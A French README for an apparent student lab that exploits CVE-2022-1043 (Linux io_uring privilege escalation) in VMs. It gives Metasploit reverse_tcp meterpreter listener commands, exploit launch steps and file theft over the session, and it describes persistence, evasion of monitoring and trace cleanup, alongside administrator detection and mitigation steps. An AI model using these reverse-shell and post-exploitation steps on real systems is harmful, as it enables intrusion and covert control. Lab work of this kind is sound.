# CVE-2022-1043

## Explication de la vulnérabilité et mécanisme d'exploitation

D'après la description de la faille dans le code source [cve-2022-1043.c](https://github.com/opensrcsec/same_type_object_reuse_exploits/blob/main/cve-2022-1043.c),  
l'exploitation de la faille crée de nombreux processus de `io_uring` pour saturer la mémoire. Cela déclenche un débordement du compteur d'identifiants (*ID wrap*), forçant l'attribution d'un identifiant de processus ou de credential incorrect (UID=0) à un utilisateur non privilégié.

La faille exploite un bug dans l'interface `io_uring` lié à la fonction `put_cred()` pour tirer parti des erreurs de gestion de mémoire dans les structures de credentials. Une structure de credential déjà libérée est réallouée à un autre processus, ce qui donne lieu à un *Use-after-Free*. L'attaque se sert de ce "dangling pointer" pour forcer la réallocation de cette mémoire à un processus SUID (comme `su`), permettant ainsi à l'attaquant de prendre le contrôle de cette structure.  
L'attaque détourne l'UID du processus root et crée un binaire SUID pour maintenir un accès root.

---

## le service/programme compromis,type de compromission.

Le service compromis est le noyau Linux via l'interface `io_uring`. L'attaque s'appuie sur des programmes de type SUID comme `su` ou `passwd`, ce qui permet d’obtenir une élévation de privilèges. La faille concerne les machines tournant sous Linux à partir du moment où la version du kernel se trouve dans la plage affectée par la vulnérabilité (c.-à-d. entre `v5.12-rc3` et `v5.14-rc7`) et a été faille a été corrigée au commit `a30f895ad323`.

---

        **************************
        Mise en place de l'attaque        
        **************************
       	
# 1 Prérequis pour l'Infrastructure

## 1.1 Utilisation de vagrant
La construction de la VM peut se faire avec vagrant. Il faut avoir une version de virtualbox (ou avec vmware) avec les plugins compatibles et suivre étapes par étapes les instructions dans le README. 

Pour lancer une VM avec vagrant, aller dans un répetoire du dépôt qui contient un vagrantFile, lancer les commandes suivantes pour manipuler la VM (dans un terminal linux ou windows (git bash fonctionne) avec vagrant installé).
```
vagrant up
vagrant halt    # Arrêter la VM
vagrant destroy # Supprimer la VM
```

## 1.2 Machine cible
La machine de l'attaquant se construit directement avec le vagranfile fourni dans le rétertoire `Target_host`.

Attention, le fait de changer de noyau dans le GRUB au demarage risque de mettre la VM dans un état incoherent sans activer la connection SSH qui est neccéssaire à vagrant pour provisionner la VM ce qui va bloquer son demarrage. Sinon il serait mieux de directement utiliser une VM kali-linux téléchargable depuis le site de kali Linux [kali-linux](https://www.kali.org/get-kali/#kali-virtual-machines) pour éviter d'avoir toutes ces contraintes avec les plugins virtualbox/Vmware et vagrant. Nous avons mis en place l'attaque avec les deux méthodes et vérifié le bon fonctionnement.

## 1.3 Machine distante (attaquant)
La machine de l'attaquant se construit directement avec le vagranfile fourni dans le rétertoire `Attack_host`.

## 1.4 Le réseau
Il faut connecter la machine cible sur un réseau maitrisé (évitez un réseau publique comme wifi campus) car les VM vont faire le DHCP pour avoir des adresses sur le même LAN que l'hote. On peut simplement connecter la machine hote sur le point d'accès d'un smartphone avec une connection internet et cela est suffisant. Il faut verifier dans les VM que les adresses IP sont dans le meme LAN.
Dans le cas où la VM cible est mise en place directement avec une VM téléchargée sur le site de kali Linux, il faut activer une deuxieme interface réseau sur le mode d'accès "accès par pont" dans la configuration virtualbox de cette VM.


# 2 Mise en place de l'infrastructure

Pour mettre en place les instructions qui suivent, il est mieux de toujours se connecter à la VM avec des comptes administrateur.

Informations de connexion au VMs : 
```
* pour la VM construite avec vagrant == > user: vagrant, passwd: vagrant
* pour la VM téléchargée sur le site de kali Linux == > user: kali, passwd: kali` 
```
* architecture typique du système d’information qui pourrait être impliquée dans l’exploitation de cette faille.

                                 **********************
                              infrastructure pour l'exploitation
                                 **********************
			   
		attaquant	         * * * * *    	            cible   
		+-------+               *         *		  +-------+
		|  PC1  | --- +++ ---  *  Réseau   *  --- +++ --- |  PC2  |
		+-------+               *         *               +-------+
         metasploit installé             * * * * *                  affected kernels from v5.12-rc3 to v5.14-rc7
         
         
## 2.1 Sur la machine d'attaque  
Le fichier vagrantFile de la VM se trouve dans le repertoire `Attack_host`.

* Lancer metasploit `msfconsole`

* Créer une session meterpreter et configurer le Listener avec Metasploit
``` 
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set LHOST IP_machine_attaque sur eth1
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > set PAYLOAD linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run
```

## 2.2 Sur la machine cible
Le fichier vagrantFile de la VM se trouve dans le repertoire `Target_host`.

### 2.2.1 Mettre en oeuvre l'infrastructure vulnérable : on a choisit la version de noyau v5.12-rc

* Si on utilise la VM téléchagée, il faudra une fois dans la VM :
Depuis la VM téléchager les scripts du dossier Target_host dans le [repository](https://gitlab.ensimag.fr/kamdoumc/projet-secu-3a/-/tree/main) et se placer dans /sharedFolder 
``` 
* sudo mkdir -p /sharedFolder
* sudo cp /home/$(whoami)/Downloads/*.sh /sharedFolder
* chmod +x /sharedFolder/set_vulnKernel.sh 
* sudo ./sharedFolder/set_vulnKernel.sh
```
L'execution du script `set_vulnKernel.sh` permet de télécharger et installer les headers, modules et image du kernel et les dependences nécessaires puis mettre à jour le GRUB.

* Si on utilise la VM construites par vagrant, tout est déja mis en place dans le vagrantfile

### 2.2.2 Création de deux comptes utilisateur non privilégié par l'administrateur pour tester la faille

Un compte servira à exploiter la faille et l'autre servira à tester le comportement une fois les correctifs appliqués par l'administrateur.

Cela est déja mis en place dans les script, il y'a pas de commande à faire.

**Attention**, au redemarrage il faut choisir la version du kernel (5.12) manuellent depuis le GRUB. 

### 2.2.3 Scénario de l'attaque

L'objectif, en plus de l'escalade de privilèges en local pour passer en root, est de coupler cela à une session meterpreter sur la machine de l'attaquant grâce à un payload reverse_tcp, permettant d'avoir une plus grande surface d'attaque en accédant à la machine cible à distance avec des privilèges root.

Pour ce faire, l'attaquant cherche à connaître l'IP de la machine cible à attaquer et vérifie que la cible présente bien la vulnérabilité exploitable en fonction de la version du kernel et/ou avec Metasploit. Depuis sa propre machine (la machine d'attaque), on peut :

* utiliser Metasploit pour obtenir des informations sur l'exploit et vérifier la vulnérabilité de la cible à partir de son @IP ;
* construire un payload reverse_tcp avec son adresse IP et un port ;
* préparer l'exécutable de l'exploit en compilant son code source C ;
* lancer un exploit de type Listener avec Metasploit sur sa machine pour écouter les connexions sur un port précis ;
* chercher un moyen d'avoir un accès physique/SSH sur la machine cible avec un compte sans privilèges root ;
* lancer l'exploit sur la cible pour obtenir les privilèges root.
Après avoir obtenu un shell root sur la cible, on peut, à ce moment-là, s'ajouter soit dans le groupe sudo de manière permanente, soit dans un autre groupe (pour tenter de passer inaperçu) avec les privilèges les plus élevés possibles, soit faire les deux.

Pour exploiter pleinement les potentiels de cette faille, on peut consulter les données sensibles du véritable administrateur et les récupérer, s'ajouter en SSH ou effectuer toute autre action permettant d'avoir un accès distant (Remote) sur la cible. De plus, on lance le payload reverse_tcp en tant que root pour établir une session meterpreter à distance depuis sa machine, ce qui permet ensuite de lancer d'autres attaques avec Metasploit comme l'utilisation de la webcam, la création d'un déni de service, ou encore la suppression du véritable administrateur du groupe sudo. Si on veut passer inaperçu, on peut limiter certaines actions le temps qu'il s'en aperçoive. On peut aussi essayer de vérifier s'il a mis en place des mécanismes de surveillance avec des démons comme inotify ou autres, et les limiter, voire les arrêter.

Pour cette démonstration, une fois la session meterpreter établie entre l'attaquant et la cible, on télécharge un fichier depuis la cible vers la machine distante, le modifie depuis la machine d'attaque, et le renvoie sur la cible. Pour éviter de laisser des traces, on nettoie les fichiers/modifications.


### 2.2.4 Action de l'attaquant sur la cible

* Utiliser msfvenom pour créer un payload reverse_tcp à exécuter sur la machine cible, recuperer le code de l'exploit sur github et compiler. 

Les codes et les payloads reverse_tcp sont déjà disponibles pour les utilisateurs, il y'a rien à faire.

* Lancer l'exploit pour passer en root : 
Ouvrir deux terminaux.

Se tenir sur l'utilisateur vulnUser1 dans le deux terminaux:  `su vulnUser1`, il faut renseigner le mot de passe "vulnUser1". Puis `cd execs`. Lancer le script `./vulnUser1_attack.sh`. Si l'attaque n'aboutit pas rapidemment il faut lancer le script dans le deuxieme terminal en parallèle ou meme les arreter et les relancer. Une foit l'exploitation de la faille reussie, on est en root. Lancer `./use_exploit.sh IP_machine_distante` pour exploiter la faille et se connecter sur la machine d'attaque.

**Attention** l'exploitation de la faille n'est possible qu'une seule fois par utilisateur.


## 2.3 Sur la machine d'attaque
* Vérifier la session et les privilèges si reverse_tcp reussi.

`meterpreter > shell`

Si le shell ne repond pas faire `python3 -c 'import pty; pty.spawn("/bin/bash")'`

* Verifier la session obtenue

`meterpreter > getuid`
 
* Sortir de la session sans l'arreter

`meterpreter > background`  

* Voir les sessions Meterpreter

`msf6 > sessions`    

* Se connecter à une session

`msf6 > sessions -i N°_session`    

* Télécharger le fichier de test de la cible vers la machine d'attaque

`meterpreter > download /home/vulnUser1/file_test.txt`

* Modifier le fichier sur la machine d'attaque :

`nano file_test.txt`

* Renvoyer le fichier modifié sur la cible :

`meterpreter > upload file_test.txt /home/vulnUser1/`


# 3 Action de l'administrateur
Retourner sur la machine cible.

L'admin peut effectuer des actions pour mieux gérer son système et limiter l'exploitation de l'attaque. Si ce n'est pas possible de mettre à jour le kernel vers une verion postérieur à la 5.14, il peut mettre en place d'autres actions. Pour ce faire, il utilise `inotify` et `auditctl` pour verifier l'activité sur les fichiers `/etc/group` et `/etc/sudoers`. Il limite aussi le nombre de processus et le nombre de fichiers ouverts pour les utilisateurs non privilégiés pour permettre de stopper l'attaque. L'activation de `SELinux` limite certaines manipulations sur le systèmes.

Depuis le terminal, avec l'utilisateur Admin (vagrant ou kali) :
``` 
sudo cp -r /home/vulnUser1/execs/ . 
cd execs
ls -l   # pour verifier les droits root
sudo ./actions_Admin.sh        
sudo ./monitoring.sh
```
Désormais, s'il y a de l'activité sur les fichiers surveillés `inotify` affiche une notification sur l'écran. Par exmple depuis vulnUser1 effectuer `sudo visudo` et une notification avec plus d'informations s'affiche sur l'écran.

Dans un deuxième terminal Admin, faire : 
``` 
* cat monitoring_logs.txt		# afficher les logs Inotify
* sudo ./audit_monitoring_folder.sh     # afficher les logs auditctl
```
Exemple de sortie: 

        **********************************
        time->Sun Dec  8 09:24:40 2024

        type=PROCTITLE msg=audit(1733667880.725:256): proctitle=7375646F0076697375646F

        type=PATH msg=audit(1733667880.725:256): item=0 name="/etc/sudoers" inode=1049775 dev=08:01 mode=0100440 ouid=0 ogid=0 

        rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0

        type=CWD msg=audit(1733667880.725:256): cwd="/home/vulnUser1/execs"

        type=SYSCALL msg=audit(1733667880.725:256): arch=c000003e syscall=257 success=yes exit=5 a0=ffffff9c a1=7ffde9194c70 

        a2=800 a3=0 items=1 ppid=5067 pid=27029 auid=1000 uid=0 gid=1001 euid=1 suid=0 fsuid=1 egid=0 sgid=1001 fsgid=0 tty=pts1

        ses=2 comm="sudo" exe="/usr/bin/sudo" subj==unconfined key="sudoers_modification"

         **************************

On peut voir par exemple la commande effectuée : `comm="visudo" exe="/usr/sbin/visudo"`. 
L'endroit depuis lequel la commande a été executée : `cwd="/home/vulnUser1/execs"` et l'id de l'utilisateur : `auid=1000`, pour connaitre l'utilisateur correspondant, dans le terminal : `id 1000`.
La partie `uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0` montre que l'utilisateur a effectué la commande en tant que root par sudo. Si l'activité est suspecte, on peut vérifier les membres de sudo avec `getent group sudo `. 
Pour consulter les fichiers pour sudo : `nano /etc/sudoers` `nano /etc/sudoers.d/`.

Pour verifier qu'il n'y a pas un nouveau groupe avec des privileges, il faut supprimer un utilisateur dans un groupe privilégié avec `sudo deluser vulnUser1` et verifier les ports ouverts avec `sudo lsof -i -P -n` et `nmap IP_addr`.

`sudo lsof -i -P -n` donne :
```
COMMAND    PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
dhclient   614 root    7u  IPv4  21258      0t0  UDP *:68 
dhclient   718 root    7u  IPv4  20058      0t0  UDP *:68 
sshd       807 root    7u  IPv4  21519      0t0  TCP *:22 (LISTEN)
sshd       807 root    8u  IPv6  21521      0t0  TCP *:22 (LISTEN)
reverse_t 6735 root    7u  IPv4  35381      0t0  TCP 192.168.1.86:42184->192.168.1.85:4444 (ESTABLISHED)
```
* Arreter les processus suspects `sudo kill 6735` et vérifier `sudo lsof -i -P -n`
* Tuer les processus de vulnUser1 `sudo pkill -u vulnUser1`
* Si neccesaire, supprimer definitivement `sudo userdel -f vulnUser1`
* Et consulter son repertoire `sudo ls /home/vulnUser1` pour voir les traces.

On redémare et choisi maintenant la version de kernel 6. Pour verifier que l'attaque ne fonctionne plus : 
* lancer le script:  `sudo ./move_to_non_vuln_kernel.sh`
* dans le GRUB au redemarrage `choisir la version 6. du kernel` 
* dans le systeme, verifier la version du kernel: `uname -a`
* suivre les mêmes étapes décrites à la section **2.2.3 Action de l'attaquant** mais en tant que utilisateur vulnUser2.


# Actions supplementaires de l'attaquant sur la cible 
* verifier les privilèges du groupe sudo  

`nano /etc/sudoers` `nano /etc/sudoers.d/`  

Si sudo a les privileges souhaités, on s'ajoute dans sudo. Sinon on crée un nouveau groupe avec les privilèges souhaités.
* nouveau groupe

`groupadd new_group`

* éditer le fichier `/etc/sudoers` pour donner les actions de new_group

sudo visudo

* s'ajouter dans dans ce groupe

`adduser vulnUser new_group`

* voir son username et ses groupes

`groups $(whoami)` 

* Voir les utilisateurs (si on souhaite manipuler les privilèges sur certains utilisateurs)

`cat /etc/passwd`

*Supprimer un utilisateur

`sudo userdel <user_to_delete>`

Il faut bien penser à faire un nettoyage des fichiers/modifications pour éviter de laisser des traces.

*****************
*************************
# références utilisées
**************************

Recherche de CVE :

* exploit-db: https://www.exploit-db.com/
* CVE-details: https://www.cvedetails.com/vulnerability-search.php
* NIST: https://nvd.nist.gov/vuln/search
* CERT: http://cert.ssi.gouv.fr/

Outils :

* Documentation vagrant: https://developer.hashicorp.com/vagrant/docs
* Documentation Docker: https://docs.docker.com/reference/
* Site kali-linux: https://www.kali.org/
* Documentation metaspoit: https://docs.metasploit.com/

* codes de la CVE :

* Github metasploit Linux : https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits/linux
* Github code source exploit : https://github.com/opensrcsec/same_type_object_reuse_exploits/blob/main/cve-2022-22942.c
* Rapid7: https://www.rapid7.com/db/modules/exploit/linux/local/cve_2022_1043_io_uring_priv_esc/

Mise en place de la version du kernel linux :
* libssl1.1: http://ftp.de.debian.org/debian/pool/main/o/openssl
* modules et headers: https://kernel.ubuntu.com/mainline/v5.12-rc6/amd64
